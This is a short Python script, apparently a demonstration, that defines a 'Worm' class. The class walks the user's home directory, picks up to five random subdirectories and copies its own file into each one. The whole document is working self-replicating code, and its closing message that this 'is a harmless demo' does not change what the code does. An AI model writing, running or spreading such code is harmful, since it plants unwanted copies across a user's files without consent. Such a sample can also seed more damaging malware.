import os
import random
import shutil

class Worm:
    """ Worm class that replicates itself to random directories. """

    def __init__(self, worm_name):
        self.worm_name = worm_name

    def get_random_directories(self, path, count=5):
        """ Get a list of random directories to infect. """
        directories = []
        for root, dirs, files in os.walk(path):
            for directory in dirs:
                directories.append(os.path.join(root, directory))
        return random.sample(directories, min(len(directories), count))

    def replicate(self, target_directories):
        """ Copy itself into the target directories. """
        for directory in target_directories:
            try:
                target_path = os.path.join(directory, self.worm_name)
                shutil.copy(__file__, target_path)
                print(f"Worm copied to: {target_path}")
            except Exception as e:
                print(f"Failed to copy to {directory}: {e}")

if __name__ == "__main__":
    # Worm initialization
    worm_name = "worm_demo.py"
    worm = Worm(worm_name)

    # Target base path for replication (user's home directory in this case)
    base_path = os.path.expanduser("~")

    # Get random directories and replicate the worm
    target_dirs = worm.get_random_directories(base_path)
    worm.replicate(target_dirs)

    print("Worm replication complete. This is a harmless demo.")
